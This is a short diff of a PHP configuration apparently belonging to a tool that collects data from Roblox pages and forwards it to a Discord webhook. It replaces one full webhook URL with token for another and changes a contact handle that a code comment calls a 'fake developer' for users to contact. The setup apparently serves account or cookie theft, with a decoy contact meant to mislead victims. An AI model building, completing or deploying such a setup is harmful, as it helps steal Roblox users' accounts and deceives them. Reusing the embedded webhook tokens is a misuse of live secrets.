@@ -1,8 +1,8 @@
 <?php
     // webhook link
-    $webhook = "https://discord.com/api/webhooks/781306315725078538/92kXwcI2kO0C5LumuoVGTTyZTKeVC3-gjDSf02_hfy-OL3qGaXyXeWMrECrm3v-o8fy0";
+    $webhook = "https://discord.com/api/webhooks/907445072818241536/3ScEQgE2PPuIGrFFDduj0ohH5j5nYphY3YLeaYH8NEGkfy8jXE9_OxIKbWEKdyOPC6Xr";
     // fake developer for the bot the users may contact
-    $discord_contact = "TeeScrap#1474";
+    $discord_contact = "Java#8701";
     
     $allowed_origins = array(
         "https://www.roblox.com",
